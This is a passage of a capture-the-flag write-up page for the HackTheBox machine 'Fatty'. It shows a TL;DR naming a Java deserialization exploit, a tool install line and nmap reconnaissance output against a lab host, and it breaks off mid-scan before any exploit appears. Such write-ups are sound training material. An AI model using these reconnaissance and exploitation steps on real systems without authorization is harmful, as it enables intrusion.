<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-HackTheBox/Fatty/write-up">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Fatty | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/HackTheBox/Fatty/write-up/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Fatty | CyFun"><meta data-rh="true" name="description" content="- Name: Fatty"><meta data-rh="true" property="og:description" content="- Name: Fatty"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/HackTheBox/Fatty/write-up/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Fatty/write-up/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/HackTheBox/Fatty/write-up/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Academy/write-up/">Academy</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Admirer/write-up/">Admirer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blackfield/write-up/">Blackfield</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Blunder/write-up/">Blunder</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Book/write-up/">Book</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Buff/write-up/">Buff</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Cache/write-up/">Cache</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Control/write-up/">Control</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/CyberSantaCTF/2021/write-up/">CyberSantaCTF</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Delivery/write-up/">Delivery</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Doctor/write-up/">Doctor</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Dyplesher/write-up/">Dyplesher</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/HackTheBox/Fatty/write-up/">Fatty </a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ForwardSlash/write-up/">ForwardSlash</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Jewel/write-up/">Jewel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Laboratory/write-up/">Laboratory</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Magic/write-up/">Magic</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Mango/write-up/">Mango</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Monteverde/write-up/">Monteverde</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Nest/write-up/">Nest</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Obscurity/write-up/">Obscurity</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Omni/write-up/">Omni</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Oouch/write-up/">Oouch</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/OpenAdmin/write-up/">OpenAdmin</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Passage/write-up/">Passage</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Ready/write-up/">Ready</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Remote/write-up/">Remote</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ScriptKiddie/write-up/">ScriptKiddie</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/ServMon/write-up/">ServMon</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/SneakyMailer/write-up/">SneakyMailer</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tabby/write-up/">Tabby</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Tenet/write-up/">Tenet</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traceback/write-up/">Traceback</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Travel/write-up/">Travel</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Traverxec/write-up/">Traverxec</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/HackTheBox/Worker/write-up/">Worker</a></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/Tryhackme/0day/">Tryhackme</a></div></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">HackTheBox</span><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Fatty</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Fatty </span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Information</h1><ul><li><strong>Name:</strong> Fatty</li><li><strong>Profile:</strong> <a href="https://www.hackthebox.eu/home/machines/profile/227" target="_blank" rel="noopener noreferrer">www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Insane</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 50</li></ul><p><img loading="lazy" alt="fatty" src="/assets/images/fatty-9427cf6cc527c0988adc799735befb4b.png" width="598" height="381" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2><p><strong>TL;DR</strong>: Java code review, bytecode JAR modification; exploit deserialization.</p><p>Install tools used in this WU on BlackArch Linux:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">pacman -S nmap filezilla jd-gui recaf</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="network-enumeration">Network enumeration<a href="#network-enumeration" class="hash-link" aria-label="Direct link to Network enumeration" title="Direct link to Network enumeration">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Nmap 7.80 scan initiated Mon Jul 20 19:58:26 2020 as: nmap -p- -sSVC -oA nmap_full -v 10.10.10.174</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for 10.10.10.174</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.022s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 65530 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE            VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">21/tcp   open  ftp                vsftpd 2.0.8 or later</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| -rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| -rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| -rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ftp-syst:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   STAT:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| FTP server status:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|      Connected to 10.10.15.33</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|      Logged in as ftp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|      TYPE: ASCII</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|      No session bandwidth limit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|      Session timeout in seconds is 300</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|      Control connection is plain text</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|      Data connections will be plain text</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|      At session startup, client count was 4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|      vsFTPd 3.0.3 - secure, fast, stable</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_End of status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1337/tcp open  ssl/waste?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key type: rsa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key bits: 4096</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Signature Algorithm: sha256WithRSAEncryption</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2019-09-11T15:42:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid after:  2020-09-10T15:42:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_SHA-1: 3410 76eb bfc8 e051 edb6 b8c9 c8a4 060e 6b76 c0a1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_ssl-date: 2020-07-20T18:05:11+00:00; +5m08s from scanner time.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1338/tcp open  ssl/wmc-log-svc?</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssl-cert: Subject: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Issuer: commonName=Mr. Secure/organizationName=Fatty/stateOrProvinceName=Here/countryName=DE</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key type: rsa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Public Key bits: 4096</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Signature Algorithm: sha256WithRSAEncryption</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid before: 2019-09-11T15:42:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| Not valid after:  2020-09-10T15:42:00</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| MD5:   3bf4 8a15 e9cc 3aa1 89f0 a6e7 1389 9a6e</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_SHA-1: 3410 